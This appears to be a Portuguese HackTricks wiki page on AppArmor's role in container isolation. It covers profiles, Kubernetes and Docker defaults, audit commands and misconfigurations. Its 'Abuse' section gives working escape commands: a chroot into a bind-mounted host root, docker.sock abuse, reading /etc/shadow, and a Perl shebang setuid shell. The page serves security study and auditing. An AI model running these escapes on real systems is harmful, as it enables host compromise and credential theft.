# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## Função No Isolamento De Containers

O AppArmor é um sistema de **Mandatory Access Control** que aplica restrições por meio de profiles específicos para cada programa. Diferentemente das verificações tradicionais de DAC, que dependem muito da propriedade de usuários e grupos, o AppArmor permite que o kernel aplique uma policy vinculada ao próprio processo. Em ambientes de containers, isso é importante porque uma workload pode ter privilégios tradicionais suficientes para tentar realizar uma ação e, ainda assim, ser bloqueada porque o profile do AppArmor não permite o path, mount, comportamento de rede ou uso de capability relevante.

O ponto conceitual mais importante é que o AppArmor é **baseado em paths**. Ele avalia o acesso ao filesystem por meio de regras de paths, em vez de usar labels, como o SELinux faz. Isso o torna acessível e poderoso, mas também significa que bind mounts e layouts alternativos de paths exigem atenção especial. Se o mesmo conteúdo do host se tornar acessível por um path diferente, o efeito da policy pode não ser o que o operador esperava inicialmente.

## Função No Isolamento De Containers

As revisões de segurança de containers geralmente param nas capabilities e no seccomp, mas o AppArmor continua sendo importante após essas verificações. Imagine um container com mais privilégios do que deveria ou uma workload que precisou de uma capability adicional por motivos operacionais. O AppArmor ainda pode restringir o acesso a arquivos, o comportamento de mounts, a rede e os padrões de execução de maneiras que interrompem o caminho óbvio de abuso. É por isso que desativar o AppArmor "apenas para fazer a aplicação funcionar" pode transformar silenciosamente uma configuração meramente arriscada em uma ativamente explorável.

## Laboratório

Para verificar se o AppArmor está ativo no host, use:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
Para ver sob qual contexto o processo atual do container está sendo executado:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
A diferença é instrutiva. No caso normal, o processo deve mostrar um contexto AppArmor associado ao profile escolhido pelo runtime. No caso unconfined, essa camada extra de restrição desaparece.

Você também pode verificar o que o Docker considera ter aplicado:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## Uso em Runtime

O Docker pode aplicar um perfil AppArmor padrão ou personalizado quando o host oferece suporte a ele. O Podman também pode integrar-se ao AppArmor em sistemas baseados em AppArmor, embora, em distribuições que priorizam SELinux, o outro sistema MAC geralmente ocupe o papel principal. O Kubernetes pode expor políticas AppArmor no nível do workload em nodes que realmente oferecem suporte ao AppArmor. O LXC e ambientes relacionados de system containers da família Ubuntu também usam AppArmor extensivamente.

O ponto prático é que AppArmor não é um "recurso do Docker". Ele é um recurso do kernel do host que vários runtimes podem optar por aplicar. Se o host não oferecer suporte a ele ou se o runtime for instruído a executar como unconfined, a suposta proteção não estará realmente presente.

Especificamente para Kubernetes, a API moderna é `securityContext.appArmorProfile`. Desde o Kubernetes `v1.30`, as anotações beta antigas do AppArmor estão deprecated. Em hosts compatíveis, `RuntimeDefault` é o perfil padrão, enquanto `Localhost` aponta para um perfil que já deve estar carregado no node. Isso é importante durante uma revisão, pois um manifest pode parecer compatível com AppArmor e, ainda assim, depender totalmente do suporte no node e de perfis previamente carregados.

Um detalhe operacional sutil, mas útil, é que definir explicitamente `appArmorProfile.type: RuntimeDefault` é mais rigoroso do que simplesmente omitir o campo. Se o campo for definido explicitamente e o node não oferecer suporte ao AppArmor, a admissão deverá falhar. Se o campo for omitido, o workload ainda poderá ser executado em um node sem AppArmor e simplesmente não receber essa camada extra de confinamento. Do ponto de vista de um atacante, esse é um bom motivo para verificar tanto o manifest quanto o estado real do node.

Em hosts compatíveis com AppArmor e Docker, o padrão mais conhecido é `docker-default`. Esse perfil é gerado a partir do template AppArmor do Moby e é importante porque explica por que alguns PoCs baseados em capabilities ainda falham em um container padrão. Em termos gerais, `docker-default` permite networking comum, nega escritas em grande parte de `/proc`, nega acesso a partes sensíveis de `/sys`, bloqueia operações de mount e restringe ptrace para que ele não seja uma primitiva geral de sondagem do host. Entender essa baseline ajuda a distinguir entre "o container possui `CAP_SYS_ADMIN`" e "o container pode realmente usar essa capability contra as interfaces do kernel que me interessam".

## Gerenciamento de Profiles

Os perfis AppArmor geralmente são armazenados em `/etc/apparmor.d/`. Uma convenção de nomenclatura comum é substituir as barras no caminho do executável por pontos. Por exemplo, um perfil para `/usr/bin/man` normalmente é armazenado como `/etc/apparmor.d/usr.bin.man`. Esse detalhe é importante tanto para defesa quanto para assessment, pois, quando você conhece o nome do perfil ativo, geralmente pode localizar rapidamente o arquivo correspondente no host.

Comandos úteis de gerenciamento no host incluem:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
A razão pela qual esses comandos são importantes em uma referência de container-security é que eles explicam como os profiles são realmente criados, carregados, alternados para complain mode e modificados após alterações na aplicação. Se um operador tem o hábito de colocar profiles em complain mode durante a troubleshooting e esquecer de restaurar o enforcement, o container pode parecer protegido na documentação, enquanto na realidade se comporta de forma muito mais permissiva.

### Criando e atualizando profiles

`aa-genprof` pode observar o comportamento da aplicação e ajudar a gerar um profile interativamente:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof` pode gerar um perfil de modelo que posteriormente pode ser carregado com `apparmor_parser`:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
Quando o binário muda e a policy precisa ser atualizada, `aa-logprof` pode reproduzir as negações encontradas nos logs e ajudar o operador a decidir se deve permiti-las ou negá-las:
```bash
sudo aa-logprof
```
### Logs

As negações do AppArmor geralmente são visíveis por meio do `auditd`, do syslog ou de ferramentas como `aa-notify`:
```bash
sudo aa-notify -s 1 -v
```
Isso é útil operacionalmente e ofensivamente. Defenders usam isso para aprimorar profiles. Attackers usam isso para descobrir qual caminho ou operação exata está sendo negada e se o AppArmor é o controle que está bloqueando uma exploit chain.

### Identificando O Arquivo Exato Do Profile

Quando um runtime exibe um nome específico de profile do AppArmor para um container, geralmente é útil associar esse nome novamente ao arquivo do profile no disco:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
Isso é especialmente útil durante a análise no host porque faz a ponte entre "o container diz que está sendo executado sob o profile `lowpriv`" e "as regras reais estão neste arquivo específico, que pode ser auditado ou recarregado".

### Regras de Alto Sinal para Auditar

Quando você puder ler um profile, não pare nas linhas simples de `deny`. Vários tipos de regras alteram significativamente a eficácia do AppArmor contra uma tentativa de container escape:

- `ux` / `Ux`: executa o binário de destino sem restrições. Se um helper, shell ou interpretador acessível estiver permitido sob `ux`, isso normalmente é a primeira coisa a testar.
- `px` / `Px` e `cx` / `Cx`: realizam transições de profile durante o exec. Isso não é automaticamente ruim, mas vale a pena auditar porque uma transição pode levar a um profile muito mais abrangente que o atual.
- `change_profile`: permite que uma task alterne para outro profile carregado, imediatamente ou no próximo exec. Se o profile de destino for mais fraco, isso pode se tornar a escape hatch pretendida para sair de um domínio restritivo.
- `flags=(complain)`, `flags=(unconfined)` ou o mais recente `flags=(prompt)`: isso deve mudar o nível de confiança que você deposita no profile. `complain` registra as negações em vez de aplicá-las, `unconfined` remove a boundary, e `prompt` depende de um caminho de decisão em userspace, em vez de uma negação aplicada puramente pelo kernel.
- `userns` ou `userns create,`: políticas mais recentes do AppArmor podem mediar a criação de user namespaces. Se um profile de container permitir isso explicitamente, user namespaces aninhados continuam em jogo mesmo quando a plataforma usa AppArmor como parte de sua estratégia de hardening.

grep útil no host:
```bash
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
Esse tipo de auditoria costuma ser mais útil do que analisar centenas de regras comuns de arquivos. Se um breakout depende da execução de um helper, da entrada em um novo namespace ou da fuga para um profile menos restritivo, a resposta geralmente está oculta nessas regras orientadas a transições, e não nas linhas óbvias no estilo `deny /etc/shadow r`.

## Misconfigurations

O erro mais óbvio é `apparmor=unconfined`. Administradores costumam defini-lo ao depurar uma aplicação que falhou porque o profile bloqueou corretamente algo perigoso ou inesperado. Se essa flag permanecer em produção, toda a camada MAC terá sido efetivamente removida.

Outro problema sutil é presumir que bind mounts são inofensivos porque as permissões dos arquivos parecem normais. Como o AppArmor é baseado em paths, expor paths do host em locais de mount alternativos pode interagir de forma problemática com as regras de path. Um terceiro erro é esquecer que o nome de um profile em um arquivo de configuração significa muito pouco se o kernel do host não estiver realmente aplicando o AppArmor.

## Abuse

Quando o AppArmor desaparece, operações que antes eram restritas podem funcionar de repente: ler paths sensíveis por meio de bind mounts, acessar partes do procfs ou sysfs que deveriam continuar mais difíceis de usar, executar ações relacionadas a mounts se capabilities/seccomp também permitirem, ou usar paths que um profile normalmente negaria. O AppArmor costuma ser o mecanismo que explica por que uma tentativa de breakout baseada em capabilities "deveria funcionar" no papel, mas ainda assim falha na prática. Remova o AppArmor, e a mesma tentativa pode começar a funcionar.

Se você suspeitar que o AppArmor é o principal elemento impedindo uma cadeia de abuso baseada em path-traversal, bind-mount ou mount, o primeiro passo geralmente é comparar o que se torna acessível com e sem um profile. Por exemplo, se um path do host estiver montado dentro do container, comece verificando se você consegue percorrê-lo e lê-lo:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
Se o container também tiver uma capability perigosa, como `CAP_SYS_ADMIN`, um dos testes mais práticos é verificar se o AppArmor é o controle que está bloqueando operações de montagem ou o acesso a filesystems sensíveis do kernel:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
Em ambientes nos quais um caminho do host já está disponível por meio de um bind mount, perder o AppArmor também pode transformar um problema de divulgação de informações somente leitura em acesso direto a arquivos do host:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
O objetivo desses comandos não é que o AppArmor, por si só, crie o breakout. É que, uma vez removido o AppArmor, vários caminhos de abuso baseados em filesystem e mounts se tornam imediatamente testáveis.

### Exemplo completo: AppArmor desabilitado + root do host montado

Se o container já tiver o root do host montado via bind em `/host`, a remoção do AppArmor pode transformar um caminho de abuso do filesystem bloqueado em um escape completo do host:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Uma vez que o shell esteja executando através do sistema de arquivos do host, a workload efetivamente escapou dos limites do container:
```bash
id
hostname
cat /etc/shadow | head
```
### Exemplo completo: AppArmor desativado + socket do runtime

Se a barreira real fosse o AppArmor em torno do estado do runtime, um socket montado poderia ser suficiente para um escape completo:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
O caminho exato depende do ponto de montagem, mas o resultado final é o mesmo: o AppArmor não impede mais o acesso à runtime API, e a runtime API pode iniciar um container que compromete o host.

### Exemplo Completo: Bypass de Bind-Mount Baseado em Caminho

Como o AppArmor é baseado em caminhos, proteger `/proc/**` não protege automaticamente o mesmo conteúdo do procfs do host quando ele pode ser acessado por um caminho diferente:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
O impacto depende exatamente do que é montado e de a rota alternativa também ignorar outros controles, mas esse padrão é uma das razões mais claras pelas quais o AppArmor deve ser avaliado junto com o layout de montagem, e não isoladamente.

### Full Example: Shebang Bypass

Às vezes, a política do AppArmor direciona-se a um caminho de interpreter de uma forma que não considera completamente a execução de scripts por meio do processamento de shebang. Um exemplo histórico envolvia o uso de um script cuja primeira linha aponta para um interpreter confinado:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
Esse tipo de exemplo é importante como lembrete de que a intenção do perfil e a semântica real de execução podem divergir. Ao revisar o AppArmor em ambientes de container, as cadeias de interpretadores e os caminhos alternativos de execução merecem atenção especial.

## Verificações

O objetivo dessas verificações é responder rapidamente a três perguntas: o AppArmor está habilitado no host, o processo atual está confinado e o runtime realmente aplicou um perfil a este container?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
cat /sys/kernel/security/apparmor/profiles 2>/dev/null | sort | head -n 50   # Loaded profiles straight from securityfs
grep -REn '(^|[[:space:]])(ux|Ux|px|Px|cx|Cx|pix|Pix|cix|Cix|pux|PUx|cux|CUx|change_profile|userns)\b|flags=\(.*(complain|unconfined|prompt).*\)' /etc/apparmor.d 2>/dev/null
```
O que é interessante aqui:

- Se `/proc/self/attr/current` mostrar `unconfined`, o workload não está se beneficiando do confinamento do AppArmor.
- Se `aa-status` mostrar que o AppArmor está desabilitado ou não carregado, qualquer nome de profile na configuração do runtime é, em grande parte, apenas cosmético.
- Se `docker inspect` mostrar `unconfined` ou um profile customizado inesperado, esse costuma ser o motivo pelo qual um caminho de abuso baseado em filesystem ou mount funciona.
- Se `/sys/kernel/security/apparmor/profiles` não contiver o profile esperado, a configuração do runtime ou do orchestrator, por si só, não é suficiente.
- Se um profile supostamente hardened contiver regras no estilo `ux`, `change_profile` amplo, `userns` ou `flags=(complain)`, o limite prático pode ser muito mais fraco do que o nome do profile sugere.

Se um container já tiver privilégios elevados por razões operacionais, manter o AppArmor habilitado frequentemente faz a diferença entre uma exceção controlada e uma falha de segurança muito mais ampla.

## Padrões do Runtime

| Runtime / plataforma | Estado padrão | Comportamento padrão | Enfraquecimento manual comum |
| --- | --- | --- | --- |
| Docker Engine | Habilitado por padrão em hosts compatíveis com AppArmor | Usa o profile AppArmor `docker-default`, a menos que seja sobrescrito | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | Depende do host | O AppArmor é suportado por meio de `--security-opt`, mas o padrão exato depende do host/runtime e é menos universal do que o profile `docker-default` documentado pelo Docker | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | Padrão condicional | Se `appArmorProfile.type` não for especificado, o padrão será `RuntimeDefault`, mas ele só será aplicado quando o AppArmor estiver habilitado no node | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost` com um profile fraco, nodes sem suporte ao AppArmor |
| containerd / CRI-O under Kubernetes | Segue o suporte do node/runtime | Runtimes com suporte comum ao Kubernetes oferecem suporte ao AppArmor, mas a aplicação efetiva ainda depende do suporte do node e das configurações do workload | Igual à linha do Kubernetes; a configuração direta do runtime também pode ignorar completamente o AppArmor |

Para o AppArmor, a variável mais importante geralmente é o **host**, não apenas o runtime. Uma configuração de profile em um manifest não cria confinamento em um node onde o AppArmor não está habilitado.

## Referências

- [Kubernetes security context: AppArmor profile fields and node-support behavior](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)
- [Ubuntu 24.04 `apparmor.d(5)` manpage: exec transitions, `change_profile`, `userns`, and profile flags](https://manpages.ubuntu.com/manpages/noble/en/man5/apparmor.d.5.html)
{{#include ../../../../banners/hacktricks-training.md}}
